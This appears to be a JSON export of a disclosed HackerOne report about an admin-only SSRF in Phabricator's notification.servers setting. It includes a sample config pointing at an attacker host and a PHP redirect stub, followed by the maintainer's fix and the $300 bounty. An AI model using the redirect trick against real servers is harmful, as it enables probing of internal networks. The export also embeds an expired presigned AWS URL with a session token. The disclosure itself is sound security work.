{"id":850114,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTAxMTQ=","url":"https://hackerone.com/reports/850114","title":"SSRF in notifications.server configuration","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-04-15T04:21:16.539Z","submitted_at":"2020-04-15T04:21:16.539Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"codeprivate","url":"/codeprivate","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/o2dA5gEvRUHtCkpZwAqo3y4p/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":18,"url":"https://hackerone.com/phabricator","handle":"phabricator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Phabricator","twitter_handle":"phabricator","website":"http://phacility.com/phabricator/","about":"Phabricator is a collection of open source web applications that help software companies build better software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-15T14:10:22.270Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-04-15T14:10:12.751Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003cmongoose\u003e\n\nModifying the notification server settings so that it connects to a malicious server. An attacker is able to redirect traffic from the vulnerable application to internal or external network resources.\nSteps To Reproduce:\n---------------------\n 1. Open your phabricator installation authenticated with an administrator user.\n 2. Go to Config\u003e Settings\u003e notification.servers\n 3. Copy the values ​​of \"Simple Example\" and replace them in \"Database Value\" with the attacker's data. ( in type admin block )\n\nsomething like that:\n```\n[\n  {\n    \"type\": \"client\",\n    \"host\": \"phabricator.mycompany.com\",\n    \"port\": 22280,\n    \"protocol\": \"https\"\n  },\n  {\n    \"type\": \"admin\",\n    \"host\": \"X.X.X.X\",\n    \"port\": 22281,\n    \"protocol\": \"http\"\n  }\n]\n```\nBeing X.X.X.X is the IP of the malicious server.\n\n4 . The malicious server receives a GET request from the victim server to the path \"/ status\", puts an index.php file in that directory of his server and can redirect the destination of the original request to internal or external assets.\n\nPoC\n```\n\u003c?php\nheader(\"Location: http://anywere.loc/bad_intentions\");\n?\u003e\n```\n\n\u003c/mongoose\u003e\n\n## Impact\n\nIn a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.\nReferer: https://www.owasp.org/index.php/Server_Side_Request_Forgery\n\nI made a video exploiting this vulnerability in my own phabricator installation. demonstrating the steps to reproduce, and making 2 types of attacks possible with this.\n (F788864)","vulnerability_information_html":"\u003cp\u003e\u0026lt;mongoose\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eModifying the notification server settings so that it connects to a malicious server. An attacker is able to redirect traffic from the vulnerable application to internal or external network resources.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eOpen your phabricator installation authenticated with an administrator user.\u003c/li\u003e\n\u003cli\u003eGo to Config\u0026gt; Settings\u0026gt; notification.servers\u003c/li\u003e\n\u003cli\u003eCopy the values ​​of \u0026quot;Simple Example\u0026quot; and replace them in \u0026quot;Database Value\u0026quot; with the attacker\u0026#39;s data. ( in type admin block )\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003esomething like that:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[\n  {\n    \u0026quot;type\u0026quot;: \u0026quot;client\u0026quot;,\n    \u0026quot;host\u0026quot;: \u0026quot;phabricator.mycompany.com\u0026quot;,\n    \u0026quot;port\u0026quot;: 22280,\n    \u0026quot;protocol\u0026quot;: \u0026quot;https\u0026quot;\n  },\n  {\n    \u0026quot;type\u0026quot;: \u0026quot;admin\u0026quot;,\n    \u0026quot;host\u0026quot;: \u0026quot;X.X.X.X\u0026quot;,\n    \u0026quot;port\u0026quot;: 22281,\n    \u0026quot;protocol\u0026quot;: \u0026quot;http\u0026quot;\n  }\n]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBeing X.X.X.X is the IP of the malicious server.\u003c/p\u003e\n\n\u003cp\u003e4 . The malicious server receives a GET request from the victim server to the path \u0026quot;/ status\u0026quot;, puts an index.php file in that directory of his server and can redirect the destination of the original request to internal or external assets.\u003c/p\u003e\n\n\u003cp\u003ePoC\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Location: http://anywere.loc/bad_intentions\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u0026lt;/mongoose\u0026gt;\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIn a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.\u003cbr\u003e\nReferer: \u003ca title=\"https://www.owasp.org/index.php/Server_Side_Request_Forgery\" href=\"/redirect?url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FServer_Side_Request_Forgery\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.owasp.org/index.php/Server_Side_Request_Forgery\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI made a video exploiting this vulnerability in my own phabricator installation. demonstrating the steps to reproduce, and making 2 types of attacks possible with this.\u003cbr\u003e\n (F788864)\u003c/p\u003e\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":788864,"file_name":"SSRF-Phabricator-POC.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/juXzBPMskzmXcXyzCbDq8PKB?response-content-disposition=attachment%3B%20filename%3D%22SSRF-Phabricator-POC.mp4%22%3B%20filename%2A%3DUTF-8%27%27SSRF-Phabricator-POC.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070124Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026X-Amz-Signature=070feed988341cfa46593e201ec80919e6da980806b9b7868617299243c94dc6","file_size":15448937,"type":"video/mp4"}],"allow_singular_disclosure_at":"2020-05-15T14:10:12.816Z","allow_singular_disclosure_after":-19673471.23032986,"singular_disclosure_allowed":true,"vote_count":22,"voters":["mik317","brahim_boufakri01","mygf","0xdeadbife","since2003","twavesx","khalifa0","cyberarmy007","tday20","pr1v35c","and 12 more..."],"severity":{"rating":"medium","score":4.7,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"high","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7670983,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"A user must be an administrator to complete step (1), and can already execute SSRF attacks in other ways if they are (for example, by configuring an OAuth authentication provider against `http://anywhere.loc/bad_intentions`).\n\nFor consistency with other configuration options, the `notification.servers` configuration option should probably be \"locked\", and there's no reason for us to follow redirects on these requests. I'll make these changes upstream.\n\nHowever, in the general case. Phabricator treats it as permissible for Phabricator administrators to configure Phabricator so that it make requests to private resources, because common use cases often require this. After these changes, this attack will still be possible by configuring a malicious OAuth provider, and likely by configuring a malicious Git, Mercurial, or Subversion server. I don't believe we can reasonably prevent these attacks in the general case while still allowing users to do things they reasonably expect to be able to do, like work with internal and external repositories.","markdown_message":"\u003cp\u003eA user must be an administrator to complete step (1), and can already execute SSRF attacks in other ways if they are (for example, by configuring an OAuth authentication provider against \u003ccode\u003ehttp://anywhere.loc/bad_intentions\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003eFor consistency with other configuration options, the \u003ccode\u003enotification.servers\u003c/code\u003e configuration option should probably be \u0026quot;locked\u0026quot;, and there\u0026#39;s no reason for us to follow redirects on these requests. I\u0026#39;ll make these changes upstream.\u003c/p\u003e\n\n\u003cp\u003eHowever, in the general case. Phabricator treats it as permissible for Phabricator administrators to configure Phabricator so that it make requests to private resources, because common use cases often require this. After these changes, this attack will still be possible by configuring a malicious OAuth provider, and likely by configuring a malicious Git, Mercurial, or Subversion server. I don\u0026#39;t believe we can reasonably prevent these attacks in the general case while still allowing users to do things they reasonably expect to be able to do, like work with internal and external repositories.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-15T11:58:07.186Z","updated_at":"2020-04-15T11:58:07.186Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7672648,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I believe I have fixed this upstream in \u003chttps://secure.phabricator.com/D21123\u003e. In particular:\n\n  - The `notification.servers` configuration is now \"Hidden\", so it can only be edited by users with command line access.\n  - Requests from Phabricator to the notification server no longer follow \"Location\" redirects.","markdown_message":"\u003cp\u003eI believe I have fixed this upstream in \u003ca title=\"https://secure.phabricator.com/D21123\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FD21123\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/D21123\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. In particular:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003enotification.servers\u003c/code\u003e configuration is now \u0026quot;Hidden\u0026quot;, so it can only be edited by users with command line access.\u003c/li\u003e\n\u003cli\u003eRequests from Phabricator to the notification server no longer follow \u0026quot;Location\u0026quot; redirects.\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-04-15T14:02:36.120Z","updated_at":"2020-04-15T14:02:36.120Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"codeprivate","url":"/codeprivate"},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7672724,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"In assessing an award for this report, I am primarily considering the extremely low severity of the attack under Phabricator's threat model. The threat model generally permits administrative SSRF because we can not reasonably prevent it while behaving in a way users expect the software to behave under common use cases (like interacting with a mixture of internal and external repositories).\n\nStill, this specific attack vector can be mitigated easily and the mitigations improve consistency anyway. Since I made changes in response to this report and the report was careful and thorough, I'm accepting and awarding it.","markdown_message":"\u003cp\u003eIn assessing an award for this report, I am primarily considering the extremely low severity of the attack under Phabricator\u0026#39;s threat model. The threat model generally permits administrative SSRF because we can not reasonably prevent it while behaving in a way users expect the software to behave under common use cases (like interacting with a mixture of internal and external repositories).\u003c/p\u003e\n\n\u003cp\u003eStill, this specific attack vector can be mitigated easily and the mitigations improve consistency anyway. Since I made changes in response to this report and the report was careful and thorough, I\u0026#39;m accepting and awarding it.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-15T14:09:12.144Z","updated_at":"2020-04-15T14:09:12.144Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Phabricator"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"phabricator","collaborator":{"username":"codeprivate","url":"/codeprivate"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7672732,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"The fix is publicly available in the upstream, so this can be disclosed at any time. Let me know if it looks like I missed anything. Thanks for the report!","markdown_message":"\u003cp\u003eThe fix is publicly available in the upstream, so this can be disclosed at any time. Let me know if it looks like I missed anything. Thanks for the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-15T14:10:12.765Z","updated_at":"2020-04-15T14:10:12.765Z","first_to_agree":true,"actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7690357,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty. I've seen the fix, it's ok. \nI will continue auditing.","markdown_message":"\u003cp\u003eThanks for the bounty. I\u0026#39;ve seen the fix, it\u0026#39;s ok. \u003cbr\u003e\nI will continue auditing.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-16T22:21:42.989Z","updated_at":"2020-04-16T22:21:42.989Z","actor":{"username":"codeprivate","cleared":false,"url":"/codeprivate","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/o2dA5gEvRUHtCkpZwAqo3y4p/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8011458,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-15T14:10:22.326Z","updated_at":"2020-05-15T14:10:22.326Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Phabricator"}},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}